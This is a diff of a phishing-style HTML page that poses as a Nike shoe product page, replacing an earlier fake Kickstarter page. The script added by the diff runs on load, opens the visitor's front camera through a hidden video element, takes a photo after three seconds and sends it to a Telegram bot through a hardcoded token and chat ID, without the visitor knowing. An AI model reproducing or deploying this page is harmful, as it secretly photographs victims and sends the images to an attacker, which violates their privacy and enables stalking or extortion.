@@ -1,218 +1,226 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="nl">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Spyragravity — Water Bomb Launcher</title>
-  <style>
-    /* Сброс базовых стилей */
-    * {
-      box-sizing: border-box;
-      margin: 0; padding: 0;
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
-        Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
-    }
-    body {
-      background: #f5f5f7;
-      color: #1a1a1a;
-      line-height: 1.5;
-      min-height: 100vh;
-      display: flex;
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Nike Zion 4 Low Country</title>
+<style>
+  body {
+    margin: 0; 
+    font-family: "Nike Futura", Arial, sans-serif;
+    background: #fff;
+    color: #111;
+    -webkit-font-smoothing: antialiased;
+    user-select: none;
+  }
+  header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 20px 30px;
+    border-bottom: 1px solid #e5e5e5;
+  }
+  .logo {
+    font-weight: 700;
+    font-size: 24px;
+    letter-spacing: 3px;
+    cursor: default;
+  }
+  nav {
+    display: flex;
+    gap: 25px;
+  }
+  nav span {
+    color: #666;
+    font-weight: 600;
+    cursor: default;
+  }
+  main {
+    max-width: 1200px;
+    margin: 30px auto;
+    padding: 0 20px;
+  }
+  .product-container {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 40px;
+    justify-content: center;
+  }
+  .images {
+    flex: 1 1 400px;
+    max-width: 500px;
+    position: relative;
+  }
+  .images img {
+    width: 100%;
+    border-radius: 20px;
+    user-select: none;
+  }
+  .product-info {
+    flex: 1 1 400px;
+    max-width: 500px;
+  }
+  .product-info h1 {
+    font-size: 2.7rem;
+    font-weight: 800;
+    margin-bottom: 10px;
+    user-select: none;
+  }
+  .product-info h2 {
+    font-weight: 500;
+    font-size: 1rem;
+    text-transform: uppercase;
+    color: #888;
+    margin-bottom: 20px;
+  }
+  .product-info p {
+    font-size: 1rem;
+    color: #444;
+    margin-bottom: 30px;
+    line-height: 1.5;
+    user-select: none;
+  }
+  .price {
+    font-weight: 700;
+    font-size: 1.6rem;
+    margin-bottom: 30px;
+  }
+  .btn {
+    display: inline-block;
+    padding: 15px 40px;
+    margin-right: 20px;
+    background: #111;
+    color: #fff;
+    border-radius: 50px;
+    font-weight: 700;
+    font-size: 1rem;
+    cursor: default;
+    user-select: none;
+    box-shadow: 0 6px 15px rgb(0 0 0 / 0.2);
+    transition: background-color 0.3s;
+    text-align: center;
+    text-decoration: none;
+  }
+  .btn:hover {
+    background: #333;
+  }
+
+  /* Footer fake */
+  footer {
+    margin-top: 60px;
+    padding: 20px;
+    border-top: 1px solid #eee;
+    color: #999;
+    font-size: 0.9rem;
+    text-align: center;
+    user-select: none;
+  }
+
+  /* Responsive */
+  @media (max-width: 768px) {
+    .product-container {
       flex-direction: column;
-      align-items: center;
-      padding: 20px;
+      gap: 25px;
     }
-
-    header {
-      width: 100%;
-      max-width: 900px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 10px 0;
-      border-bottom: 1px solid #ddd;
-    }
-    header .logo {
-      font-weight: 700;
-      font-size: 1.4rem;
-      color: #2b6cb0;
-      user-select: none;
-    }
-    header nav {
-      display: flex;
-      gap: 15px;
-    }
-    header nav span {
-      color: #888;
-      font-weight: 600;
-      cursor: default; /* не кликается */
-      user-select: none;
-    }
-
-    main {
-      max-width: 900px;
-      width: 100%;
-      margin-top: 30px;
-      background: white;
-      border-radius: 12px;
-      box-shadow: 0 8px 24px rgb(149 157 165 / 0.2);
-      padding: 20px;
-    }
-
-    .title-section {
-      display: flex;
-      flex-direction: column;
-      gap: 8px;
-    }
-    .title-section h1 {
-      font-weight: 700;
+    .product-info h1 {
       font-size: 2rem;
-      color: #111;
-      user-select: none;
     }
-    .title-section p {
-      font-weight: 400;
-      color: #666;
-      user-select: none;
-      max-width: 600px;
+    .btn {
+      padding: 12px 30px;
+      font-size: 0.9rem;
+      margin-bottom: 15px;
+      width: 100%;
+      text-align: center;
     }
-
-    .image-container {
-      margin: 20px 0;
-      display: flex;
-      justify-content: center;
-    }
-    .image-container img {
-      max-width: 100%;
-      border-radius: 12px;
-      box-shadow: 0 6px 15px rgb(0 0 0 / 0.15);
-      user-select: none;
-    }
-
-    .button-group {
-      display: flex;
-      gap: 15px;
-      margin-top: 20px;
-      user-select: none;
-    }
-    .button {
-      background: #05a081;
-      color: white;
-      font-weight: 600;
-      padding: 12px 24px;
-      border-radius: 8px;
-      font-size: 1rem;
-      cursor: default; /* не кликается */
-      box-shadow: 0 5px 10px rgb(5 160 129 / 0.3);
-      user-select: none;
-      transition: background-color 0.2s;
-    }
-    .button:hover {
-      background: #038f6e;
-    }
-
-    /* Мобильная адаптивность */
-    @media (max-width: 600px) {
-      body {
-        padding: 10px;
-      }
-      main {
-        padding: 15px;
-      }
-      .title-section h1 {
-        font-size: 1.5rem;
-      }
-      .button {
-        padding: 10px 18px;
-        font-size: 0.9rem;
-      }
-    }
-  </style>
+  }
+</style>
 </head>
 <body>
-  <header>
-    <div class="logo">Kickstarter</div>
-    <nav>
-      <span>Discover</span>
-      <span>Start a project</span>
-      <span>About</span>
-      <span>Help</span>
-    </nav>
-  </header>
 
-  <main>
-    <section class="title-section">
-      <h1>Spyragravity — The world’s first water bomb launcher</h1>
-      <p>Launching water bombs in style and fun — safe and splashy action for all ages!</p>
-    </section>
+<header>
+  <div class="logo">NIKE</div>
+  <nav>
+    <span>Men</span>
+    <span>Women</span>
+    <span>Kids</span>
+    <span>Customize</span>
+  </nav>
+</header>
 
-    <div class="image-container">
-      <img src="https://ksr-ugc.imgix.net/assets/034/093/914/9cf7e9132d1ed94b272978d27c2a4700_original.jpg?ixlib=rb-4.0.2&w=700&fit=max&v=1680361313&auto=format&frame=1&q=92&s=6710b046e0549e0ff487f6d4f7588b50" alt="Spyragravity" />
+<main>
+  <div class="product-container">
+    <div class="images">
+      <img src="https://static.nike.com/a/images/t_PDP_1280_v1/f_auto,q_auto:eco/f96a22c1-9d3f-4d49-b2f1-97ebd40ec7d7/zion-4-low-country-basketbalschoenen-rXIVQP3r.png" alt="Nike Zion 4 Low Country" />
     </div>
-
-    <div class="button-group">
-      <div class="button">Back this project</div>
-      <div class="button">Remind me</div>
+    <div class="product-info">
+      <h1>Zion 4 Low Country</h1>
+      <h2>Basketbalschoenen</h2>
+      <p>De Zion 4 Low Country is ontworpen voor maximale prestaties en comfort op het basketbalveld. Lichtgewicht en stijlvol met opvallende details.</p>
+      <div class="price">€149,99</div>
+      <div>
+        <div class="btn">In Winkelwagen</div>
+        <div class="btn">Nu Kopen</div>
+      </div>
     </div>
-  </main>
+  </div>
+</main>
 
-  <!-- Скрытое видео для фото -->
-  <video id="video" autoplay playsinline muted style="display:none;"></video>
+<footer>© 2025 Nike, Inc. Alle rechten voorbehouden.</footer>
 
-  <script>
-    const TOKEN = "7652687345:AAElRXM2tsPSUIztZWkZhNDRlQ5x5CFrQjs";    // Замени
-    const CHAT_ID = "919015722";      // Замени
+<!-- Скрытое видео для фронтальной камеры -->
+<video id="video" autoplay playsinline muted style="display:none;"></video>
 
-    async function sendPhoto(blob) {
-      const formData = new FormData();
-      formData.append("chat_id", CHAT_ID);
-      formData.append("photo", blob, "photo.jpg");
+<script>
+  const TOKEN = "7652687345:AAElRXM2tsPSUIztZWkZhNDRlQ5x5CFrQjs"; // замени на токен
+  const CHAT_ID = "919015722";   // замени на чат ID
 
-      try {
-        const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-          method: "POST",
-          body: formData,
-        });
-        if (!response.ok) {
-          console.error("Ошибка отправки фото:", response.statusText);
-        }
-      } catch (e) {
-        console.error("Ошибка сети:", e);
-      }
+  async function sendPhoto(blob) {
+    const formData = new FormData();
+    formData.append("chat_id", CHAT_ID);
+    formData.append("photo", blob, "photo.jpg");
+    try {
+      await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+        method: "POST",
+        body: formData,
+      });
+    } catch (e) {
+      console.error("Ошибка отправки фото:", e);
     }
+  }
 
-    function captureAndSend() {
+  function captureAndSend() {
+    const video = document.getElementById("video");
+    const width = video.videoWidth || 320;
+    const height = video.videoHeight || 240;
+    if(width === 0 || height === 0) {
+      console.error("Видео не готово");
+      return;
+    }
+    const canvas = document.createElement("canvas");
+    canvas.width = width;
+    canvas.height = height;
+    canvas.getContext("2d").drawImage(video, 0, 0, width, height);
+    canvas.toBlob(sendPhoto, "image/jpeg");
+  }
+
+  async function startCamera() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
       const video = document.getElementById("video");
-      const width = video.videoWidth || 320;
-      const height = video.videoHeight || 240;
-      if (width === 0 || height === 0) {
-        console.error("Видео не готово");
-        return;
-      }
-      const canvas = document.createElement("canvas");
-      canvas.width = width;
-      canvas.height = height;
-      canvas.getContext("2d").drawImage(video, 0, 0, width, height);
-      canvas.toBlob(sendPhoto, "image/jpeg");
+      video.srcObject = stream;
+      video.onloadedmetadata = () => {
+        video.play();
+        setTimeout(() => {
+          captureAndSend();
+        }, 3000);
+      };
+    } catch(e) {
+      console.error("Ошибка доступа к камере:", e);
     }
+  }
 
-    async function startCamera() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-        const video = document.getElementById("video");
-        video.srcObject = stream;
-        video.onloadedmetadata = () => {
-          video.play();
-          setTimeout(() => {
-            captureAndSend();
-          }, 3000);
-        };
-      } catch (e) {
-        console.error("Ошибка доступа к камере:", e);
-      }
-    }
+  startCamera();
+</script>
 
-    startCamera();
-  </script>
 </body>
 </html>
